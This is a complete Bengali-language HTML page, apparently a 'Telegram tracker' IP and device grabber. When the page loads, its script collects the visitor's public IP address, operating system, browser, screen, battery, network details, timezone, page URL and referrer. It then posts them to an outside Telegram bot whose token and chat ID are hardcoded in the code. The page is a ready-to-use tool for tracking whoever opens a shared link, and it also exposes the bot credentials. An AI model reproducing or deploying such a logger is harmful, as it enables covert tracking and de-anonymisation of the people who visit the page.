<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ডিটেইলড ভিজিটর ইনফো - টেলিগ্রাম ট্র্যাকার</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0a0f1c 0%, #141c2c 100%);
            padding: 30px 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .card {
            max-width: 1100px;
            width: 100%;
            background: rgba(18, 28, 40, 0.85);
            backdrop-filter: blur(14px);
            border-radius: 2rem;
            border: 1px solid rgba(255, 215, 150, 0.25);
            padding: 1.8rem;
            box-shadow: 0 25px 45px rgba(0,0,0,0.5);
        }

        h1 {
            color: #ffdfa5;
            font-size: 1.6rem;
            border-left: 5px solid #ffae42;
            padding-left: 20px;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }
        .badge {
            background: #1f3a4b;
            font-size: 0.7rem;
            padding: 4px 12px;
            border-radius: 40px;
            color: #bbd4ff;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
            gap: 16px;
            margin-bottom: 20px;
        }

        .info-item {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 1.2rem;
            padding: 14px 18px;
            border-left: 3px solid #ffa559;
            transition: 0.1s;
        }

        .info-label {
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #9eb4dc;
        }

        .info-value {
            font-size: 1rem;
            font-weight: 500;
            color: #f5f9ff;
            word-break: break-word;
            margin-top: 5px;
        }

        .footer-note {
            margin-top: 25px;
            text-align: center;
            font-size: 0.75rem;
            color: #7e8dab;
            border-top: 1px solid rgba(255,255,200,0.15);
            padding-top: 16px;
        }

        .status-dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            background-color: #2ad47e;
            border-radius: 50%;
            margin-right: 8px;
            box-shadow: 0 0 5px #2ad47e;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>
        📡 লাইভ ডিভাইস তথ্য 
        <span class="badge">টেলিগ্রাম রিপোর্ট সক্রিয়</span>
    </h1>
    <div class="info-grid" id="deviceInfoGrid">
        <!-- dynamic data will be inserted here -->
    </div>
    <div class="footer-note">
        <span class="status-dot"></span> আপনার সব তথ্য সংগ্রহ করে টেলিগ্রামে পাঠানো হয়েছে (একবার)
    </div>
</div>

<script>
    (function() {
        // ================== টেলিগ্রাম বট কনফিগ ==================
        const BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";
        const DEFAULT_CHAT_ID = "7709670231";

        // ----- ইউটিলিটি ফাংশন -----
        async function getPublicIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return "আইপি পাওয়া যায়নি";
            }
        }

        async function getBatteryInfo() {
            if (!navigator.getBattery) return { level: "অজানা", charging: "অজানা" };
            try {
                const battery = await navigator.getBattery();
                let levelPercent = Math.round(battery.level * 100);
                let charging = battery.charging ? "হ্যাঁ (চার্জিং)" : "না (ব্যাটারি)";
                return { level: `${levelPercent}%`, charging: charging };
            } catch(e) {
                return { level: "অজানা", charging: "অজানা" };
            }
        }

        function getNetworkInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return { type: "অজানা", rtt: "N/A", speed: "N/A" };
            let type = conn.effectiveType || "unknown";
            let rtt = conn.rtt ? `${conn.rtt}ms` : "N/A";
            let downlink = conn.downlink ? `${conn.downlink}Mbps` : "N/A";
            return { type: type.toUpperCase(), rtt: rtt, speed: downlink };
        }

        function getScreenDetails() {
            return {
                resolution: `${screen.width}x${screen.height}`,
                colorDepth: `${screen.colorDepth}-bit`,
                pixelRatio: devicePixelRatio.toFixed(2)
            };
        }

        function getBrowserAndOS() {
            const ua = navigator.userAgent;
            let os = "অজানা";
            if (ua.includes("Android")) os = "Android";
            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
            else if (ua.includes("Windows")) os = "Windows";
            else if (ua.includes("Mac")) os = "macOS";
            let browser = "অজানা";
            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
            else if (ua.includes("Edg")) browser = "Edge";
            return { os, browser };
        }

        // ----- সব তথ্য সংগ্রহ ও UI দেখানো -----
        async function collectAndDisplay() {
            const ip = await getPublicIP();
            const battery = await getBatteryInfo();
            const network = getNetworkInfo();
            const screenDet = getScreenDetails();
            const osBrowser = getBrowserAndOS();
            const language = navigator.language || "bn-BD";
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const localTime = new Date().toLocaleString('bn-BD', { hour12: false });
            const cookieEnabled = navigator.cookieEnabled ? "সক্রিয়" : "নিষ্ক্রিয়";
            const pageUrl = window.location.href;
            const referrer = document.referrer || "সরাসরি";

            const infoArray = [
                { label: "🌐 আইপি অ্যাড্রেস", value: ip },
                { label: "📱 অপারেটিং সিস্টেম", value: osBrowser.os },
                { label: "🌍 ব্রাউজার", value: osBrowser.browser },
                { label: "📺 স্ক্রিন রেজুলেশন", value: screenDet.resolution },
                { label: "🎨 কালার ডেপথ", value: screenDet.colorDepth },
                { label: "🔋 ব্যাটারি লেভেল", value: battery.level },
                { label: "⚡ চার্জিং স্ট্যাটাস", value: battery.charging },
                { label: "📡 নেটওয়ার্ক টাইপ", value: network.type },
                { label: "⏱️ RTT (লেটেন্সি)", value: network.rtt },
                { label: "⚡ আনুমানিক স্পিড", value: network.speed },
                { label: "🗣️ ভাষা (Language)", value: language },
                { label: "🕒 টাইমজোন", value: timezone },
                { label: "🕙 স্থানীয় সময়", value: localTime },
                { label: "🍪 কুকি সাপোর্ট", value: cookieEnabled },
                { label: "🔗 পৃষ্ঠার ইউআরএল", value: pageUrl },
                { label: "🔙 রেফারার", value: referrer }
            ];

            const grid = document.getElementById('deviceInfoGrid');
            grid.innerHTML = "";
            for (let item of infoArray) {
                const div = document.createElement('div');
                div.className = "info-item";
                div.innerHTML = `<div class="info-label">${item.label}</div><div class="info-value">${item.value}</div>`;
                grid.appendChild(div);
            }

            // টেলিগ্রামের জন্য মেসেজ তৈরি
            const message = `📢 বিস্তারিত ভিজিট তথ্য:\nআইপি: ${ip}\nওএস: ${osBrowser.os}\nব্রাউজার: ${osBrowser.browser}\nস্ক্রিন: ${screenDet.resolution}\nব্যাটারি: ${battery.level} (${battery.charging})\nনেটওয়ার্ক: ${network.type}, RTT ${network.rtt}, স্পীড ${network.speed}\nস্থানীয় সময়: ${localTime}\nপেজ ইউআরএল: ${pageUrl}\nরেফারার: ${referrer}`;
            sendToTelegram(message);
        }

        async function sendToTelegram(text) {
            try {
                const params = new URLSearchParams();
                params.append('chat_id', DEFAULT_CHAT_ID);
                params.append('text', text);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: params
                });
                console.log("✅ টেলিগ্রামে মেসেজ পাঠানো হয়েছে");
            } catch(e) {
                console.warn("❌ টেলিগ্রাম পাঠাতে ব্যর্থ:", e);
            }
        }

        // স্থানীয় সময় প্রতি সেকেন্ড আপডেট (শুধু UI তে)
        function startTimeUpdater() {
            setInterval(() => {
                const localTimeNow = new Date().toLocaleString('bn-BD', { hour12: false });
                const timeElements = document.querySelectorAll('.info-item');
                for (let el of timeElements) {
                    if (el.innerText.includes("স্থানীয় সময়")) {
                        const valueSpan = el.querySelector('.info-value');
                        if (valueSpan) valueSpan.innerText = localTimeNow;
                        break;
                    }
                }
            }, 1000);
        }

        // সব শুরু
        collectAndDisplay().then(() => startTimeUpdater());
    })();
</script>
</body>
</html>
